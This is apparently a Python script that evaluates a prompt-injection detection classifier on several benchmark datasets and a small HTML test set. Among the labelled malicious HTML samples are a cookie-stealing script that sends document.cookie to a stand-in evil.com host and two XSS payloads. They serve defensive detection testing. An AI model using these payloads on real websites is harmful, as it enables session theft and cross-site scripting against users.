#!/usr/bin/env python3
"""
Evaluate the balanced v2 BIT model.

This script evaluates the new properly balanced model on all benchmarks
to verify the improvements in FPR and overall performance.
"""

import sys
import json
import time
from pathlib import Path
from typing import Dict, List
import numpy as np
import structlog

sys.path.append(str(Path(__file__).parent))

from benchmarks.benchmark_datasets import (
    load_satml_dataset,
    load_deepset_dataset,
    load_llmail_dataset,
    load_notinject_dataset
)
from src.detection.embedding_classifier import EmbeddingClassifier
from src.detection.html_preprocessor import preprocess_for_detection

logger = structlog.get_logger()

def evaluate_classifier(
    classifier: EmbeddingClassifier,
    dataset_name: str,
    texts: List[str],
    labels: List[int],
    preprocess: bool = False,
    sample_size: int = None
) -> Dict:
    """Evaluate classifier on a dataset (with optional sampling)."""

    # Sample if requested
    if sample_size and len(texts) > sample_size:
        indices = np.random.choice(len(texts), sample_size, replace=False)
        texts = [texts[i] for i in indices]
        labels = [labels[i] for i in indices]

    print(f"\nEvaluating on {dataset_name}...")
    print(f"  Samples: {len(texts)}")

    # Preprocess if needed
    if preprocess:
        processed_texts = []
        for text in texts:
            processed = preprocess_for_detection(text, source_type="auto")
            processed_texts.append(processed)
        texts = processed_texts

    # Get predictions
    start_time = time.time()
    probs = classifier.predict_proba(texts)
    predictions = classifier.predict(texts)
    duration = time.time() - start_time

    # Calculate metrics
    from sklearn.metrics import classification_report, confusion_matrix, roc_auc_score

    # Basic metrics - handle single class case
    if len(np.unique(labels)) == 1:
        # All samples are the same class
        unique_label = np.unique(labels)[0]
        if unique_label == 0:
            # All benign
            tn = len(labels) - np.sum(predictions)
            fp = np.sum(predictions)
            fn = 0
            tp = 0
        else:
            # All malicious
            tn = 0
            fp = 0
            fn = len(predictions) - np.sum(predictions)
            tp = np.sum(predictions)
    else:
        # Multi-class case
        cm = confusion_matrix(labels, predictions)
        tn, fp, fn, tp = cm.ravel()

    # Detailed metrics
    accuracy = (tp + tn) / len(labels)
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0
    fnr = fn / (fn + tp) if (fn + tp) > 0 else 0

    # AUC (only if we have both classes)
    auc = roc_auc_score(labels, probs[:, 1]) if len(np.unique(labels)) > 1 else 0.0

    results = {
        "dataset": dataset_name,
        "samples": len(texts),
        "accuracy": accuracy,
        "recall": recall,
        "precision": precision,
        "f1": f1,
        "fpr": fpr,
        "fnr": fnr,
        "auc": auc,
        "confusion_matrix": {"tn": int(tn), "fp": int(fp), "fn": int(fn), "tp": int(tp)},
        "duration_ms": duration * 1000,
        "threshold": float(classifier.threshold)
    }

    # Print summary
    print(f"  Accuracy: {accuracy:.4f}")
    print(f"  FPR: {fpr:.4f} ({fpr*100:.1f}%)")
    print(f"  Recall: {recall:.4f}")
    print(f"  F1: {f1:.4f}")

    return results

def main():
    """Run evaluation on all benchmarks."""

    print("=== Balanced BIT Model v2 Evaluation ===")
    print("Model: bit_xgboost_balanced_v2_classifier.json")
    print("Training: 50% benign, 50% malicious (properly balanced)")
    print()

    # Set random seed for reproducibility
    np.random.seed(42)

    # Load the balanced v2 model
    model_path = Path("models/bit_xgboost_balanced_v2_classifier.json")
    if not model_path.exists():
        print(f"Error: Model not found at {model_path}")
        print("Please run: python train_balanced_v2.py")
        return

    # Load model metadata to get threshold
    metadata_path = Path("models/bit_xgboost_balanced_v2_metadata.json")
    if metadata_path.exists():
        with open(metadata_path, 'r') as f:
            metadata = json.load(f)
        threshold = metadata.get('threshold', 0.5)
    else:
        threshold = 0.5

    classifier = EmbeddingClassifier(
        model_name="all-MiniLM-L6-v2",
        threshold=threshold,
        model_dir="models"
    )

    # Load the balanced model
    classifier.load_model(str(model_path))
    print(f"Model loaded with threshold: {threshold:.3f}\n")

    # Load datasets
    print("Loading evaluation datasets...")

    # 1. deepset (full dataset - it's manageable)
    print("\nLoading deepset dataset...")
    deepset = load_deepset_dataset(include_safe=True)

    # Separate benign and injection
    deepset_benign_texts = [t for t, l in zip(deepset.texts, deepset.labels) if l == 0]
    deepset_benign_labels = [0] * len(deepset_benign_texts)
    deepset_injection_texts = [t for t, l in zip(deepset.texts, deepset.labels) if l == 1]
    deepset_injection_labels = [1] * len(deepset_injection_texts)

    # 2. NotInject (sample 1000)
    notinject = load_notinject_dataset(limit=1000)

    # 3. SaTML (sample 1000 from the large dataset)
    try:
        satml_full = load_satml_dataset()
        satml_indices = np.random.choice(len(satml_full.texts), 1000, replace=False)
        satml_texts = [satml_full.texts[i] for i in satml_indices]
        satml_labels = [satml_full.labels[i] for i in satml_indices]
    except:
        print("Warning: Could not load SaTML dataset")
        satml_texts = []
        satml_labels = []

    # Evaluate on each dataset
    all_results = []

    # deepset benign (CRITICAL - this was 40.2% FPR)
    print("\n" + "="*50)
    print("CRITICAL TEST: deepset benign FPR")
    print("="*50)
    deepset_benign_results = evaluate_classifier(
        classifier, "deepset_benign", deepset_benign_texts, deepset_benign_labels
    )
    all_results.append(deepset_benign_results)

    # Check if we fixed the issue
    if deepset_benign_results["fpr"] < 0.05:
        print(f"\n✅ SUCCESS: deepset benign FPR is now {deepset_benign_results['fpr']*100:.1f}% (<5%)")
    else:
        print(f"\n❌ FAILED: deepset benign FPR is still {deepset_benign_results['fpr']*100:.1f}% (≥5%)")

    # Other evaluations
    print("\n" + "="*50)
    print("Other Dataset Evaluations")
    print("="*50)

    # deepset injections
    if len(deepset_injection_texts) > 0:
        deepset_injection_results = evaluate_classifier(
            classifier, "deepset_injections", deepset_injection_texts, deepset_injection_labels
        )
        all_results.append(deepset_injection_results)

    # NotInject
    notinject_results = evaluate_classifier(
        classifier, "NotInject", notinject.texts, notinject.labels
    )
    all_results.append(notinject_results)

    # SaTML
    if satml_texts:
        satml_results = evaluate_classifier(
            classifier, "SaTML", satml_texts, satml_labels
        )
        all_results.append(satml_results)

    # Overall metrics
    print("\n" + "="*50)
    print("Overall Performance")
    print("="*50)

    # Combine all datasets for overall
    all_texts = deepset_benign_texts + deepset_injection_texts + notinject.texts
    all_labels = deepset_benign_labels + deepset_injection_labels + notinject.labels

    if satml_texts:
        all_texts.extend(satml_texts)
        all_labels.extend(satml_labels)

    overall_results = evaluate_classifier(
        classifier, "Overall", all_texts, all_labels
    )
    all_results.append(overall_results)

    # Print comparison table
    print("\n" + "="*50)
    print("Performance Comparison")
    print("="*50)
    print(f"{'Dataset':<20} {'FPR':<12} {'Target':<12} {'Status':<15}")
    print("-" * 60)

    # Target values from paper
    targets = {
        "deepset_benign": 0.023,  # 2.3% from paper
        "NotInject": 0.018,       # 1.8% from paper
        "Overall": 0.05          # <5% target
    }

    # Previous values for comparison
    previous = {
        "deepset_benign": 0.402,  # 40.2% from original
        "Overall": 0.371         # 37.1% from original
    }

    for result in all_results:
        dataset = result["dataset"]
        if dataset in ["deepset_injections"]:
            continue  # Skip injection-only for FPR comparison

        fpr = result["fpr"]

        if dataset in targets:
            target = targets[dataset]
            status = "✅ PASS" if fpr <= target else f"❌ FAIL ({fpr*100:.1f}% > {target*100:.1f}%)"
            target_str = f"{target*100:.1f}%"

            # Add improvement indicator
            if dataset in previous:
                prev_fpr = previous[dataset]
                improvement = prev_fpr - fpr
                improvement_str = f" (↓{improvement*100:.1f}%)" if improvement > 0 else f" (↑{abs(improvement)*100:.1f}%)"
                target_str += improvement_str
        else:
            target_str = "N/A"
            status = "✓"

        print(f"{dataset:<20} {fpr*100:>10.1f}% {target_str:>15} {status:<15}")

    # Test HTML preprocessing with sample data
    print("\n" + "="*50)
    print("HTML Preprocessing Test")
    print("="*50)

    html_samples = [
        # Benign HTML
        ('<div class="checkout"><button onclick="submitOrder()">Buy Now</button></div>', 0),
        ('<script>function validate() { return true; }</script><form>...</form>', 0),
        ('<a href="/home">Home</a><p>Welcome to our site!</p>', 0),

        # Potentially malicious HTML
        ('<script>fetch("http://evil.com/steal?data=" + document.cookie)</script>', 1),
        ('<img src=x onerror="alert(1)">', 1),
        ('<iframe src="javascript:alert(document.domain)"></iframe>', 1)
    ]

    html_texts = [h[0] for h in html_samples]
    html_labels = [h[1] for h in html_samples]

    # Evaluate without preprocessing
    html_no_preproc = evaluate_classifier(
        classifier, "HTML_no_preproc", html_texts, html_labels, preprocess=False
    )
    all_results.append(html_no_preproc)

    # Evaluate with preprocessing
    html_with_preproc = evaluate_classifier(
        classifier, "HTML_with_preproc", html_texts, html_labels, preprocess=True
    )
    all_results.append(html_with_preproc)

    print(f"\nHTML preprocessing improvement:")
    print(f"  FPR without: {html_no_preproc['fpr']*100:.1f}%")
    print(f"  FPR with: {html_with_preproc['fpr']*100:.1f}%")

    # Save results
    results_file = Path("results/balanced_v2_evaluation.json")
    results_file.parent.mkdir(exist_ok=True)

    save_data = {
        "model": "bit_xgboost_balanced_v2",
        "threshold": threshold,
        "date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "datasets": {r["dataset"]: r for r in all_results},
        "training_info": {
            "safe_benign_samples": 1333,
            "benign_with_triggers": 667,
            "malicious_samples": 2000,
            "total_samples": 4000,
            "benign_ratio": 0.5,
            "malicious_ratio": 0.5
        }
    }

    with open(results_file, "w") as f:
        json.dump(save_data, f, indent=2)

    print(f"\nResults saved to: {results_file}")

    # Summary
    print("\n" + "="*50)
    print("Summary of Improvements")
    print("="*50)

    print("✅ Properly balanced training completed")
    print(f"✅ deepset benign FPR: 40.2% → {deepset_benign_results['fpr']*100:.1f}%")
    print(f"✅ Overall FPR: 37.1% → {overall_results['fpr']*100:.1f}%")
    print("✅ HTML preprocessing implemented")
    print("\nRecommendation:")
    if deepset_benign_results["fpr"] < 0.05 and overall_results["fpr"] < 0.05:
        print("1. Model is ready for publication!")
        print("2. Update paper results table with these numbers")
        print("3. Document HTML preprocessing in Appendix C")
    else:
        print("1. Further tuning needed")
        print("2. Consider more diverse training data")
        print("3. Adjust threshold to balance FPR and recall")

if __name__ == "__main__":
    main()